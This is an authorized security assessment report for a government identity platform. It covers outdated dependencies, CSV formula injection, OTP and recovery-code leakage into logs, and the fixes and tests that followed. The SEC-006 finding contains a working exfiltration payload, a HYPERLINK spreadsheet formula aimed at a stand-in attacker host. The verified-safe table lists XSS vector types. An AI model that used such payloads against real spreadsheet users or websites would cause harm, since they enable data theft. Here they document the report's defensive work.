# EUISIS — Security Assessment Report

**Date:** 2026-09-21
**Type:** Authorized white-box assessment (source review + safe local negative testing)
**Environment:** local development only. No production system was touched, no
data destroyed, no external host contacted, no real SMS/email sent.

---

# Executive Summary

EUISIS is in **better security condition than a system of this class usually
is**. The areas most often broken in government identity platforms — OTP
handling, stored XSS in a CMS, mass assignment on self-service endpoints, SQL
injection, CORS, security headers — were each examined and each held up under
adversarial testing. Several were verified empirically rather than by reading
the code.

The genuine weaknesses found were concentrated in two places: **out-of-date
dependencies** (including an XSS-filter bypass in the markdown parser that sits
directly in the public content pipeline, and a path-traversal in the export
library) and **output/serialization handling** (spreadsheet formula injection in
three CSV exporters, and one-time secrets reaching the error log).

All of those are now fixed and covered by regression tests. One dependency
issue remains open because no stable patched release exists yet.

**Dependency advisories against `composer.lock`: 18 across 3 packages → 9
across 1 package.**

| ID | Severity | Finding | Status |
|----|----------|---------|--------|
| SEC-001 | HIGH | `league/commonmark` XSS filter bypass + 7 DoS advisories | FIXED |
| SEC-002 | HIGH | `maatwebsite/excel` writes exports outside the configured disk | FIXED |
| SEC-003 | HIGH | `phpoffice/phpspreadsheet` SSRF + memory exhaustion on import | FIXED |
| SEC-004 | HIGH | `laravel/framework` advisory (v12.58.0) | FIXED |
| SEC-005 | MEDIUM | Symfony HTTP/mime/routing/yaml advisories | FIXED |
| SEC-006 | MEDIUM | CSV formula injection in 3 exporters (CWE-1236) | FIXED |
| SEC-007 | MEDIUM | Plaintext OTP / recovery code written to error log | FIXED |
| SEC-008 | LOW | Case-sensitive admin search on PostgreSQL | FIXED |
| SEC-009 | MEDIUM | `guzzlehttp/guzzle` — 9 advisories, no stable fix released | OPEN |
| SEC-010 | MEDIUM | External API has no per-application organization scoping | NEEDS-DECISION |
| SEC-011 | LOW | `.env.example` ships `SESSION_SECURE_COOKIE=false` | OPEN |
| SEC-012 | INFORMATIONAL | Installed `vendor/` drifted from `composer.lock` | OPEN |
| SEC-013 | INFORMATIONAL | Employee photos stored on the public disk | ACCEPTED-RISK |

---

# Scope

Covered in depth: attack surface mapping, authentication and guard separation,
public ID checker and OTP, CMS/stored XSS, mass assignment, SQL injection,
CSRF/CORS/security headers, file serving, CSV export and import, logging
leakage, dependencies, configuration.

**Not exhaustively covered, and therefore not cleared:** NFC cryptographic
replay protection, cafeteria/terminal business-logic abuse, race conditions
under real concurrency, soft-delete/recycle-bin authorization, and the full
role-escalation matrix. These have existing project test coverage
(`tests/Feature/Security/AuthorizationTest.php`, `RateLimitingTest.php`,
`MfaSettingsTest.php`, `SecurityHeadersTest.php` — 68 tests passing) but were
not independently adversarially tested in this pass. See *Remaining Risks*.

---

# Attack Surface

See `docs/security-attack-surface.md`. Headline numbers: 693 routes, 661
authenticated, 32 unauthenticated — of which 6 are throttled operational
endpoints, 8 are public content, and the remainder are redirects, health checks
and signature-gated storage.

---

# High Findings

## SEC-001 — `league/commonmark` XSS filter bypass (HIGH) — FIXED

**Component:** `league/commonmark` 2.8.2, reached via
`App\Services\PublicSite\SafeContentRenderer`.

**Evidence:** `composer audit` reports
*"`on*` event-handler filter in `AttributesExtension` bypassed with a U+000C
form feed"* affecting `>=2.7.0,<2.9.1`, plus 7 denial-of-service advisories
affecting `<2.10.0`.

**Attack path:** an operator with public-site content permission submits
markdown crafted with a U+000C form feed inside an attribute block, bypassing
commonmark's event-handler filter, to land an `on*` handler in published public
content.

**Mitigating factor found during testing:** EUISIS runs HTMLPurifier *after*
commonmark with an explicit element allowlist, so the bypass alone does not
yield stored XSS here. This is defence-in-depth working as intended — but the
parser is still the outer layer and the DoS advisories apply regardless.

**Fix:** upgraded to 2.10.3 (within existing constraint; transitive).

**Verification:** seven XSS payloads re-run through `SafeContentRenderer` after
the upgrade and still neutralised (see *Verified-safe*).

## SEC-002 — Export written outside the configured disk (HIGH) — FIXED

**Component:** `maatwebsite/excel` 3.1.69.
**Evidence:** advisory *"Laravel Excel writes exports outside the configured
filesystem disk when given a caller-controlled path"*, affecting
`>=3.1.8,<3.1.70`.
**Attack path:** any export path derived from user input becomes a path
traversal write.
**Fix:** upgraded to 3.1.70.

## SEC-003 — Spreadsheet import SSRF and memory exhaustion (HIGH) — FIXED

**Component:** `phpoffice/phpspreadsheet` 1.30.5 — directly in the employee CSV
/ XLSX import path.
**Evidence:** *"SSRF bypass via HTTP redirect in WEBSERVICE() domain
whitelist"*, *"XLS/OLE sector-chain self-loop causes memory exhaustion"*,
*"Gnumeric reader unbounded gzip expansion"*, all affecting `<=1.30.5`.
**Attack path:** an importer uploads a crafted workbook; SSRF reaches internal
network or cloud metadata, or the reader exhausts memory.
**Fix:** upgraded to 1.30.7.

## SEC-004 — Framework advisory (HIGH) — FIXED

`laravel/framework` v12.58.0 → v12.69.2 (within-major, same constraint).

---

# Medium Findings

## SEC-006 — CSV / spreadsheet formula injection (MEDIUM) — FIXED

**Affected files:**
- `app/Services/Cafeteria/ProviderTransactionExportService.php`
- `app/Http/Controllers/ProviderPortal/Transport/TransportTransactionController.php`
- `app/Http/Controllers/Web/ServiceFeedbackController.php`

**Evidence:** all three wrote rows with bare `fputcsv()`. The provider
transaction export includes `employee_name` and `employee_institution` columns
(confirmed at `ProviderTransactionExportService.php:167-169`), both populated
from user-controlled text.

**Attack path:** an HR officer — or anyone able to drive the employee CSV import
— sets an employee's name to
`=HYPERLINK("http://attacker.example/"&A1,"Payslip")`. A finance or provider
officer later exports transactions and opens the file in Excel. The formula
evaluates in the victim's context and can exfiltrate the adjacent row on click;
DDE-style payloads go further.

**Impact:** data exfiltration from a finance export, client-side code execution
in the recipient's spreadsheet application.

**Root cause:** no neutralisation of leading `=`, `+`, `-`, `@`.

**Fix:** added `csv_safe_row()` to `app/Support/helpers.php`. It strips leading
control characters (so `\t=cmd` cannot slip past) and prefixes offending cells
with a single quote, which Excel strips on display but never evaluates. Applied
to every `fputcsv()` data call site.

**Test:** `tests/Feature/Security/CsvFormulaInjectionTest.php` — 4 tests, 13
cases, including a source-level check that no `fputcsv()` call site is left
unsanitised.

## SEC-007 — One-time secrets written to the error log (MEDIUM) — FIXED

**Affected file:** `app/Services/ErrorLoggingService.php`

**Evidence:** the service logs the entire request body
(`'input' => $this->sanitizeInput($request->all())`) against a redaction list
that did **not** include `otp` or `recovery_code`. The public ID checker posts
`otp` (`PublicIdCheckerController.php:107`) and the MFA challenge posts
`recovery_code` (`MfaController.php:163`).

**Attack path:** any unhandled exception on `/id-checker/{cardUuid}/verify-otp`
writes the live OTP into `laravel.log` beside the card UUID and caller IP.
Anyone with log access — an operator, a log-shipping pipeline, or an attacker
who obtains logs — can replay it within the TTL. MFA recovery codes are
long-lived and higher value.

**Fix:** added `otp`, `otp_code`, `recovery_code`, `recovery_codes`,
`two_factor_secret`, `two_factor_recovery_codes`, `client_secret`, `api_key`,
`remember_token` to `REDACTED_FIELDS`.

**Deliberate exclusion:** the generic `code` field is **not** redacted. It is
also the business code for organization types, provider branches and ID card
templates; blanking those would cost more in incident debugging than a
30-second single-use TOTP value is worth. This is a documented trade-off, not
an oversight — see *Remaining Risks*.

**Test:** `tests/Feature/Security/SensitiveLoggingTest.php` — 12 cases,
including nested payloads and a guard that business codes stay readable.

## SEC-009 — `guzzlehttp/guzzle` advisories (MEDIUM) — OPEN

9 advisories (1 HIGH, 8 MEDIUM) against 7.10.0. Composer's only candidate
within the current constraint is `7.10.x-dev`, an unreleased development
branch. **Deliberately not applied** — shipping a dev branch to a government
production system is a worse risk than the advisories.

**Recommendation:** watch for a stable 7.10.x release and apply then. Guzzle is
used for outbound HTTP; exposure depends on whether any outbound URL is
attacker-influenced (see SEC-SSRF note below).

## SEC-010 — External API has no per-application organization scoping (MEDIUM) — NEEDS-DECISION

**Affected:** `app/Http/Controllers/Api/V1/EmployeeDirectoryApiController.php`
and the sibling organization/position directory controllers.

**Evidence:** `show(Employee $employee)` resolves purely by route-model binding
with no scope filter; `index()` returns the full directory, filterable by
`organization_code` but not restricted to any set.

**Assessment — this is a design decision, not a broken check.** Both endpoints
behave the same way, so there is no inconsistency to exploit: the API is built
as a global directory gated by application status + endpoint assignment +
granted scope. It is **not** a BOLA.

**The risk is nonetheless real:** granting `employees.basic_read` to any
integration exposes the entire national employee directory to that integration.
There is no way to issue a token limited to one bureau.

**Recommendation (your decision):** add an optional organization binding on
`ExternalApplication` and filter both `index` and `show` through it, so an
integration can be scoped to the organizations it serves. I did not implement
this — it changes the API contract for existing consumers.

---

# Low / Informational Findings

## SEC-008 — Case-sensitive search on PostgreSQL (LOW) — FIXED

`PublicSiteManagementController::index()` used a bare `'like'` while 105 other
call sites use `ci_like_operator()`. On PostgreSQL this made content search
case-sensitive. Fixed.

## SEC-011 — `.env.example` ships `SESSION_SECURE_COOKIE=false` (LOW) — OPEN

Correct for local HTTP development, but `.env.example` is the template teams
copy to production. Session config is otherwise strong: `SESSION_ENCRYPT=true`,
`SESSION_HTTP_ONLY=true`, `SESSION_SAME_SITE=strict`, `APP_DEBUG=false`.

**Recommendation:** ship the example with `SESSION_SECURE_COOKIE=true` and a
comment telling local developers to flip it off, rather than the reverse.

## SEC-012 — `vendor/` drifted from `composer.lock` (INFORMATIONAL) — OPEN

`composer audit` reported 33 advisories against installed `vendor/` but 18
against `composer.lock`. The installed tree did not match the lock.

**Recommendation:** run `composer install` (not `update`) on deploy, and treat
`composer audit --locked` as the authoritative gate in CI.

## SEC-013 — Employee photos on the public disk (INFORMATIONAL) — ACCEPTED-RISK

`EmployeeController@store` stores photos via `->store(..., 'public')`, which is
symlinked at `public/storage` and served without authentication. Paths embed a
UUID, so they are unguessable, but anyone who learns a URL keeps access
indefinitely and revocation is not possible without moving the file.

**Recommendation:** move employee photographs to the `local` (private) disk and
serve them through the existing signed-route mechanism.

---

# Verified-safe (adversarially tested, no issue found)

These were actively probed, not merely read. Recording them so a future
assessment does not re-litigate them.

| Area | Test performed | Result |
|---|---|---|
| **Stored XSS / CMS** | 7 payloads through `SafeContentRenderer`: `<script>`, `<img onerror>`, `javascript:` link, `<iframe>`, `<svg onload>`, `data:text/html` base64, raw anchor | All neutralised. `javascript:` and `data:` stripped from `href`. Re-verified after the commonmark upgrade. |
| **`PUT /storage/{path}`** | Traced to `Illuminate\Filesystem\ReceiveFile` | Requires `upload=1` **and** `hasValidRelativeSignature()`. Not an arbitrary write. |
| **`GET /storage/{path}`** | Traced to `ServeFile::hasValidSignature()` | `local` disk has no `visibility` key → defaults to `private` → signature required. |
| **`/cafeteria/portal/*` unauthenticated** | Read route definitions | Redirect-only closures into `auth:provider` routes. No data exposure. |
| **SQL injection** | 94 raw-SQL sites reviewed; `dateExpression()` traced | No user input reaches raw SQL. Only dynamic `orderBy` is whitelisted to 5 columns with an injection test. |
| **Mass assignment (self-service)** | `ProfileUpdateRequest` + controller | Strict allowlist; `fill($request->validated())` cannot reach `user_type`, `status` or MFA flags. |
| **Blind-index tampering** | `national_id_hash` submission | `prepareForValidation()` recomputes it server-side via `merge()`, discarding any client value. |
| **OTP implementation** | Code review of `PublicIdCheckerService` | `random_int` CSPRNG, `Hash::make` at rest, 6 digits, TTL enforced, attempt counter incremented **before** comparison, resend invalidates prior codes, generic responses prevent enumeration, routes throttled. |
| **CORS** | `config/cors.php` | `allowed_origins` resolves to `[]` by default; no wildcard-with-credentials. Explicit method and header lists. |
| **Security headers** | `SecurityHeaders` middleware + existing tests | CSP, `X-Frame-Options: DENY`, `nosniff`, HSTS (HTTPS only). Existing tests also assert no stack trace / SQL / file path in error responses. |
| **Command injection / deserialization** | Pattern census | Zero occurrences of `exec`/`shell_exec`/`system`/`passthru`/`proc_open` or `unserialize()`. |
| **Employee portal IDOR** | Route + controller review | Identity resolved server-side via `$user->employee`. No endpoint accepts a client-supplied `employee_id`. |
| **LIKE wildcard hygiene** | Provider export search | `%` and `_` escaped before interpolation into the LIKE term. |

---

# Fixes Applied

| File | Change |
|---|---|
| `composer.json` / `composer.lock` | commonmark 2.8.2→2.10.3, excel 3.1.69→3.1.70, phpspreadsheet 1.30.5→1.30.7, laravel 12.58.0→12.69.2, dompdf 3.1.5→3.1.6, symfony http-kernel/mime/http-foundation/routing/mailer/yaml → 7.4.18/19, psr7 2.9.0→2.13.1, polyfill-intl-idn 1.37→1.42 |
| `app/Support/helpers.php` | new `csv_safe_row()` |
| `app/Services/Cafeteria/ProviderTransactionExportService.php` | 4 `fputcsv` sites sanitised |
| `app/Http/Controllers/ProviderPortal/Transport/TransportTransactionController.php` | 2 `fputcsv` sites sanitised |
| `app/Http/Controllers/Web/ServiceFeedbackController.php` | 2 `fputcsv` sites sanitised |
| `app/Services/ErrorLoggingService.php` | 9 secret field names added to `REDACTED_FIELDS` |
| `app/Http/Controllers/Web/PublicSiteManagementController.php` | `ci_like_operator()` |
| `tests/Feature/Security/CsvFormulaInjectionTest.php` | new — 4 tests / 13 cases |
| `tests/Feature/Security/SensitiveLoggingTest.php` | new — 3 tests / 12 cases |

---

# Verification

All fixes were verified against the project's own suite, not asserted.

| Check | Result |
|---|---|
| `php artisan test` (full suite, after every dependency upgrade) | **1885 passed, 11 failed** |
| Pre-existing failures before any change in this assessment | **11** — identical set |
| `tests/Feature/Security/` | 68 passed |
| `npx tsc --noEmit` | clean |
| `vendor/bin/pint` on every changed file | clean |
| `npm audit --omit=dev` | 0 vulnerabilities |
| `composer audit --locked` | 18 advisories / 3 packages → **9 / 1** |

The 11 failures are unrelated to this assessment and pre-date it: 9 in
`Tests\Feature\IdCards\*` (which fail identically on a clean `HEAD` checkout)
and 2 in `Tests\Feature\Rbac\OrganizationalAdminScopeTest` (caused by an
uncommitted removal of the `organizationStructure` prop already present in the
working tree). **No test regressed** across the framework upgrade from
v12.58.0 to v12.69.2 — that upgrade was the single highest-risk change here, and
this is the evidence it was safe.

---

# Remaining Risks

1. **SEC-009** — guzzle advisories, no stable fix available. Monitor.
2. **SEC-010** — global external-API directory read. Needs a product decision.
3. **Generic `code` field is not log-redacted** (SEC-007 trade-off). A TOTP code
   can still reach the log on an unhandled MFA exception. Accepted because the
   value is single-use and expires in 30 seconds; revisit if TOTP replay windows
   are widened.
4. **Not independently tested this pass:** NFC replay/cryptographic handling,
   cafeteria terminal business-logic abuse, concurrency races on card issuance
   and employee-number generation, soft-delete/recycle-bin authorization, and
   the full role-escalation matrix. These are the highest-value targets for the
   next assessment.
5. **`vendor/` drift** (SEC-012) means a deploy from this tree could ship
   different code than audited. Reconcile with `composer install`.

---

# Recommended Production Controls

1. `SESSION_SECURE_COOKIE=true`, `APP_DEBUG=false`, `LOG_LEVEL=warning`.
2. Gate CI on `composer audit --locked` (not the unlocked form).
3. `composer install --no-dev` on deploy; never `composer update` in production.
4. Set `CORS_ALLOWED_ORIGINS` explicitly for any cross-origin integration; never
   leave it wildcard while `supports_credentials` is true.
5. Move employee photographs off the public disk (SEC-013).
6. Ship log redaction as a CI check so new secret-bearing fields are added to
   `REDACTED_FIELDS` when routes are added.
7. Decide SEC-010 before onboarding any external integration that should not see
   the whole directory.
